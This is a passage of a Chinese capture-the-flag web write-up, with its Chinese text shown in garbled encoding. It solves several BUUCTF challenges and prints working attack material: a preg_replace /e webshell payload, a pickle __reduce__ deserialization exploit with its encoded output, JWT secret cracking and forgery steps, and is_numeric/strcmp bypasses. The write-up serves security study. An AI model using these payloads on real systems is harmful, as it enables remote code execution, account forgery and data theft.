<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç›¸åŒçš„æ“ä½œæ‹¿åˆ°<code>next.php</code>çš„æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°è¯­å¥<code>preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str)</code>ä¸­é‡‡ç”¨äº†<code>preg_replace/e</code>æ¨¡å¼ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ä¸Šé¢æåˆ°çš„RCEæ¥å†™å…¥å°é©¬ï¼Œæ„é€ payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">next</span>.php?id=<span class="number">1</span>&amp;\S*=$&#123;<span class="built_in">eval</span>($_POST[x])&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·æ„é€ çš„åŸå› ï¼š</p>
<ul>
<li><code>preg_replace</code>å‡½æ•°åœ¨åŒ¹é…åˆ°ç¬¦å·æ­£åˆ™çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šå°†æ›¿æ¢å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯ä¸Šå›¾preg_replaceå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰å½“åšä»£ç æ¥æ‰§è¡Œï¼Œç„¶è€Œè¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°å´å›ºå®šä¸º<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code>å­—ç¬¦ä¸²ï¼Œå°±éœ€è¦æƒ³åŠæ³•æ¥æ‰§è¡Œå®ƒã€‚</li>
<li>ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œï¼Œç›¸å½“äº<code>eval(&#39;strtolower(&quot;\\1&quot;);&#39;)</code>ç»“æœï¼Œå½“ä¸­çš„<code>\\1</code>å®é™…ä¸Šå°±æ˜¯<code>\1</code>ï¼Œè€Œ<code>\1</code>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰ï¼š<blockquote>
<p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼<strong>ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·</strong>å°†å¯¼è‡´ç›¸å…³<strong>åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­</strong>ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä»<code>1</code>å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨<code>99</code>ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨<code>&#39;\n&#39;</code>è®¿é—®ï¼Œå…¶ä¸­<code>n</code>ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</p>
</blockquote>
</li>
<li>æ‰€ä»¥è¿™é‡Œçš„<code>\1</code>å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹ï¼Œå‚è€ƒå‰é¢çš„é“¾æ¥ï¼Œæˆ‘ä»¬ä¼ å…¥<code>\S*=${eval($_POST[x])}</code>ä¾¿å¯ä»¥å°†å°é©¬å†™å…¥(<code>S</code>åŸæœ¬æ˜¯<code>.</code>ï¼Œä½†æ˜¯ä¼ å‚æ•°é¦–å­—ç¬¦æ˜¯ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ä¼šè¢«æ›¿æ¢ä¸º<code>_</code>ï¼Œç”¨<code>S</code>å¯ä»¥ç»•è¿‡)ã€‚</li>
</ul>
<h3 id="è§£é¢˜-6"><a href="#è§£é¢˜-6" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ç”¨ä¸Šé¢çš„payloadå†™å…¥å°é©¬ï¼Œç„¶åç”¨èšå‰‘è¿æ¥æ‹¿åˆ°shellï¼Œå³å¯æ‹¿åˆ°flagã€‚æ³¨æ„è¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰æŠŠä¸Šé¢çš„è¯­å¥å†™å…¥åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼Œè€Œæ˜¯è®¿é—®çš„æ—¶å€™<code>${eval($_POST[x])}</code>è¯­å¥é¦–å…ˆè¢«æ‰§è¡Œäº†ï¼Œå› æ­¤æ‰å¯ä»¥è¿æ¥ä¸Šï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿æ¥çš„æ—¶å€™ç”¨çš„ä¹Ÿå°±æ˜¯æ•´ä¸ª<code>url</code>äº†ã€‚</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>è€ƒå¯Ÿ<code>is_numeric()</code>å’Œ<code>strcmp()</code>ä¸¤ä¸ªå‡½æ•°çš„æ¼æ´</p>
<h3 id="è¡¥å……çŸ¥è¯†"><a href="#è¡¥å……çŸ¥è¯†" class="headerlink" title="è¡¥å……çŸ¥è¯†"></a>è¡¥å……çŸ¥è¯†</h3><ul>
<li><p>phpä¸­çš„strcmpæ¼æ´</p>
<blockquote>
<p>ä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹å°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯åœ¨5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åï¼Œä»å°†<code>return 0</code>ï¼ˆè¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼‰ã€‚é‚£ä¹ˆåˆ©ç”¨æ•°ç»„å³å¯ç»•è¿‡åˆ¤æ–­ã€‚</p>
</blockquote>
</li>
<li><p>phpä¸­çš„is_numeric()æ¼æ´</p>
<blockquote>
<p><code>is_numeric</code>å‡½æ•°å¯¹äºç©ºå­—ç¬¦<code>%00</code>ï¼Œæ— è®ºæ˜¯<code>%00</code>æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ<code>%20</code>ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ã€‚</p>
</blockquote>
</li>
</ul>
<h3 id="é¢˜ç›®åˆ†æ-6"><a href="#é¢˜ç›®åˆ†æ-6" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>åœ¨<code>PAYFLAG</code>é¡µé¢æºç ä¸­å‘ç°å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>æç¤ºæˆ‘ä»¬ä¼ å…¥<code>money</code>å’Œ<code>password</code>ï¼Œå¯ä»¥çœ‹åˆ°åˆ©ç”¨<code>password=404%20</code>å³å¯ç»•è¿‡<code>is_numeric</code>çš„åˆ¤æ–­ã€‚<br>æŠ“åŒ…å‘ç°<code>cookie</code>å€¼ä¸º<code>0</code>ï¼Œè€Œå¹¶æ²¡æœ‰é‡‡ç”¨<code>PHPSESSID</code>ï¼Œå°†å…¶æ”¹ä¸º<code>1</code>å³å¯ï¼Œå‘é€ä¹‹åå›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web42.png" alt=""><br>ä»ä¸­çœ‹åˆ°äº†å¯¹<code>money</code>çš„åˆ¤æ–­ï¼Œçœ‹åˆ°PHPç‰ˆæœ¬æ˜¯5.3çš„ï¼ŒçŒœæµ‹æ˜¯<code>strcmp</code>å‡½æ•°æ¯”è¾ƒçš„ï¼Œåˆ©ç”¨æ•°ç»„ç»•è¿‡å³å¯ã€‚<br><img src="http://www.ggb0n.cool/images/BUUCTF-web43.png" alt=""><br>æˆåŠŸæ‹¿åˆ°flagã€‚**å…¶å®å¯¹äºmoneyçš„ç»•è¿‡è¿˜å¯ä»¥é‡‡ç”¨ç§‘å­¦è®¡æ•°æ³•<code>money=1e11</code>ã€‚</p>
<h2 id="CISCN-2019-ikun"><a href="#CISCN-2019-ikun" class="headerlink" title="[CISCN 2019]ikun"></a>[CISCN 2019]ikun</h2><p>è€ƒå¯Ÿ<strong>è–…ç¾Šæ¯›é€»è¾‘æ¼æ´</strong>ï¼šé€šè¿‡æŠ“åŒ…ä¿®æ”¹æŠ˜æ‰£ç­‰æ•°æ®æ¥è´­ä¹°flagï¼›<strong>jwt-cookiesä¼ªé€ </strong>ã€<strong>pythonååºåˆ—åŒ–</strong></p>
<h3 id="é¢˜ç›®åˆ†æ-7"><a href="#é¢˜ç›®åˆ†æ-7" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ä¹‹åæç¤ºè¦ä¹°åˆ°<code>lv6</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web51.png" alt=""><br>æˆ‘ä»¬çœ‹åˆ°æ¯ä¸ªå•†å“éƒ½æœ‰ä¸ªç­‰çº§çš„æ ‡ç­¾ï¼ŒæŸ¥çœ‹æ ‡ç­¾å‘½åæ˜¯<code>lvx.png</code>ï¼Œå› æ­¤è‹¥è¦æ‰¾åˆ°<code>lv6</code>çš„åœ°æ–¹ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„è„šæœ¬ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://6e7db183-764d-4afc-bdbb-b70791536e4a.node3.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">    r=requests.get(url+str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">       <span class="keyword">print</span> (i)</span><br><span class="line">       <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>è·‘å‡ºæ¥<code>lv6</code>åœ¨181é¡µï¼Œä½†æ˜¯å‘ç°å¤ªè´µäº†â€¦<br>æŠ“åŒ…å‘ç°å¯ä»¥è®¾ç½®æŠ˜æ‰£ï¼Œè¿™é‡Œå°±ç”¨åˆ°äº†<strong>è–…ç¾Šæ¯›é€»è¾‘æ¼æ´</strong>ã€‚<br>ç„¶åé¡µé¢è¿”å›æç¤ºéœ€è¦æ˜¯<code>admin</code><br><img src="http://www.ggb0n.cool/images/BUUCTF-web52.png" alt=""><br>æŠ“åŒ…å‘ç°cookieé‡‡ç”¨äº†<code>JWT</code>(æ­¤å¤„å¯äº†è§£<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">JWT</a>)ï¼Œæˆ‘ä»¬æŠŠ<code>JWT</code>æ‹¿å»base64è§£ç å¾—åˆ°</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"alg"</span>:<span class="string">"HS256"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;&#123;<span class="string">"username"</span>:<span class="string">"123"</span>&#125;Â¶Â«Â”<span class="attribute">L</span>=ÂœmÃ°Â¢Ã–Ã™ÂŸJhÃÃ¶7Ã‰q"&gt;[Â‡Â¿</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>username</code>ä¸­æ˜¯æˆ‘ä»¬ç™»å½•çš„ç”¨æˆ·åï¼Œç­‰ä¸‹ä¼ªé€ <code>JWT</code>æ—¶æ”¹ä¸º<code>admin</code>å³å¯ï¼›<br>å¦å¤–ï¼Œä¼ªé€ <code>JWT</code>è¿˜éœ€è¦ç§˜é’¥ï¼Œå¯ä»¥åˆ©ç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>æ¥ç ´è§£ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web53.png" alt=""><br>æ‹¿åˆ°ç§˜é’¥ä¹‹åï¼Œåˆ°<a href="https://jwt.io/">JWTç”Ÿæˆç½‘ç«™</a>ä¼ªé€ adminçš„JWTï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web54.png" alt=""><br>æ‹¿ä¼ªé€ çš„<code>JWT</code>ä¼ªè£…æˆç®¡ç†å‘˜ï¼Œç„¶åå¾—åˆ°äº†ä¸€ä¸ªå‹ç¼©åŒ…çš„åœ°å€ï¼š<br><img src="http://www.ggb0n.cool/images/BUUCTF-web55.png" alt=""></p>
<p>ç„¶åéœ€è¦<code>æˆä¸ºå¤§ä¼šå‘˜</code>ï¼ŒBPæŠ“åŒ…å‘ç°æ˜¯åˆ©ç”¨<code>become</code>ä¼ å‚ï¼Œåœ¨æºç çš„<code>Admin.py</code>ä¸­æ‰¾åˆ°äº†è¿™ä¸ªå‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">        p = pickle.loads(urllib.unquote(become))</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°ï¼Œè¿™ä¸ªåœ°æ–¹åˆ©ç”¨äº†<code>pickle.loads</code>å¯¹<code>become</code>ä¼ å‚è¿›è¡Œååºåˆ—åŒ–(å…³äº<a href="https://blog.csdn.net/weixin_38278334/article/details/82967813">pickle</a>)ï¼Œç°åœ¨å°±éœ€è¦æ„é€ å¯è¯»å–flagæ–‡ä»¶çš„åºåˆ—åŒ–å­—ç¬¦ä¸²èµ‹ç»™<code>become</code>åˆ©ç”¨Pythonååºåˆ—åŒ–çš„æ¼æ´æ‹¿åˆ°flagã€‚</p>
<h3 id="è§£é¢˜-7"><a href="#è§£é¢˜-7" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p><img src="http://www.ggb0n.cool/images/BUUCTF-web57.png" alt=""><br>ä»å›¾ä¸­çœ‹åˆ°ï¼šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<strong><strong>reduce</strong></strong>ï¼Œå½“<strong>reduce</strong>è¢«å®šä¹‰ä¹‹åï¼Œè¯¥å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨æˆ‘ä»¬è¿™é‡Œçš„evalç”¨äºé‡å»ºå¯¹è±¡çš„æ—¶å€™è°ƒç”¨ï¼Œå³å‘Šè¯‰pythonå¦‚ä½•pickleä»–ä»¬ä¾›evalä½¿ç”¨çš„å³æ‰“å¼€çš„æ–‡ä»¶flag.txtï¼ŒEXPå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = parse.quote(a)</span><br><span class="line"><span class="keyword">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆpayloadï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">c__builtin__%<span class="number">0</span>Aeval%<span class="number">0</span>Ap0%<span class="number">0</span>A%<span class="number">28</span>S%<span class="number">22</span>open%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%<span class="number">0</span>Ap1%<span class="number">0</span>Atp2%<span class="number">0</span>ARp3%<span class="number">0</span>A.</span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨å‰é¢ä¼ªé€ çš„<code>JWT</code>åŒæ—¶å°†ä¸Šé¢çš„payloadä¼ ç»™å‚æ•°becomeå³å¯æ‹¿åˆ°flagã€‚<br><img src="http://www.ggb0n.cool/images/BUUCTF-web56.png" alt=""><br>å…³äºPythonååºåˆ—åŒ–æ¼æ´çš„å‚è€ƒï¼š<br><strong>Pickleååºåˆ—åŒ–æ¼æ´</strong>ï¼š<a href="https://xz.aliyun.com/t/2289">https://xz.aliyun.com/t/2289</a><br><strong>cPickleååºåˆ—åŒ–æ¼æ´</strong>ï¼š<a href="https://blog.csdn.net/SKI_12/article/details/85015803">https://blog.csdn.net/SKI_12/article/details/85015803</a><br><strong>Python-secçš„ä¸€äº›æ€»ç»“</strong>ï¼š<a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>è€ƒå¯Ÿ<code>unicode</code>å®‰å…¨é—®é¢˜ï¼Œå‚è€ƒå¦‚ä¸‹é“¾æ¥ï¼š<br><a href="https://xz.aliyun.com/t/5402">æµ…è°ˆUnicodeè®¾è®¡çš„å®‰å…¨æ€§</a><br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicodeç­‰ä»·æ€§æµ…è°ˆ</a><br><a href="http://unicode.org/reports/tr36/tr36-3.html#Numeric_Spoofs">UNICODE SECURITY CONSIDERATIONS</a></p>
<h3 id="è§£é¢˜-8"><a href="#è§£é¢˜-8" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>æŸ¥çœ‹æºç å‘ç°åœ¨<code>charset=UTF-8</code>å¤„æç¤º<code>Ah,really important,seriously.</code>ï¼Œè¯´æ˜æ˜¯è€ƒå¯Ÿä¸unicodeå®‰å…¨ç›¸å…³çš„çŸ¥è¯†ï¼Œå†çœ‹é¢˜ç›®é¡µé¢ï¼Œå¯ä»¥ä¹°å››ç§ç‹¬è§’å…½ï¼Œä½†æ˜¯å‰ä¸‰ç§ä»·æ ¼éƒ½æ˜¯ä¸€ä½æ•°ï¼Œè€Œç¬¬å››ä¸ªå´æ˜¯å››ä½æ•°ï¼ŒçŒœæµ‹flagå°±åœ¨ç¬¬å››ä¸ªã€‚<br>ä½†æ˜¯è¾“å…¥æ¡†åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå‚è€ƒç½‘ä¸Šçš„èµ„æ–™ï¼Œåˆ°å‰é¢çš„ç½‘ç«™æ‰¾ä¸€ä¸ªå¤§äº1337çš„ç‰¹æ®Šunicodeå­—ç¬¦ï¼Œç„¶åå°†å…¶è¿›è¡Œurlç¼–ç å¡«å…¥è¾“å…¥æ¡†æ‹¿åˆ°flagã€‚<br>å¯ä»¥å»<a href="https://www.compart.com/en/unicode/">è¿™é‡Œ</a>æ‰¾ã€‚</p>
<h2 id="WesternCTF-2018-shrine"><a href="#WesternCTF-2018-shrine" class="headerlink" title="[WesternCTF 2018]shrine"></a>[WesternCTF 2018]shrine</h2><p>è€ƒå¯Ÿ<code>SSTI</code>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œå‚è€ƒ<a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a></p>
<h3 id="é¢˜ç›®åˆ†æ-8"><a href="#é¢˜ç›®åˆ†æ-8" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) </span><br><span class="line">        + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>/shrine/</code>è·¯å¾„ä¸‹å­˜åœ¨å¯¹ç”¨æˆ·è¾“å…¥åˆ°æ¨¡æ¿æ•°æ®çš„è¿‡æ»¤ï¼Œ<code>(</code>ã€<code>)</code>è¢«æ›¿æ¢ä¸ºç©ºï¼Œ<code>config</code>ã€<code>self</code>éƒ½è¢«é»‘åå•è¿‡æ»¤æ‰ï¼Œä½†æ˜¯è¿˜æ˜¯é¿å…ä¸äº†å­˜åœ¨SSTIï¼Œå…ˆæ‹¿ä¸€ä¸ªæ•°å­¦è¡¨è¾¾å¼æµ‹è¯•ä¸€ä¸‹ï¼š<code>2</code>ï¼Œå‘ç°å¯ä»¥æ‰§è¡Œã€‚<br><img src="http://www.ggb0n.cool/images/BUUCTF-web58.png" alt=""><br>æ¥ç€çœ‹ä»£ç ï¼Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ³¨å†Œä¸€ä¸ªåä¸º<code>FLAG</code>çš„<code>config</code>ï¼Œflagåº”è¯¥å°±åœ¨è¿™ï¼Œè¿™ä¸ªåœ°æ–¹åŸæœ¬å¯ä»¥ç›´æ¥é€šè¿‡<code></code>è¯»å–æ‰€æœ‰<code>app.config</code>çš„å†…å®¹çš„ï¼Œä½†æ˜¯å‰é¢è¯´è¿‡<code>config</code>å·²ç»è¢«è¿‡æ»¤äº†ï¼šä¸‹é¢è¿™è¡Œä»£ç å°±æ˜¯å°†<code>config</code>å’Œ<code>self</code>æ›¿æ¢ä¸ºç©ºã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])</span><br></pre></td></tr></table></figure>
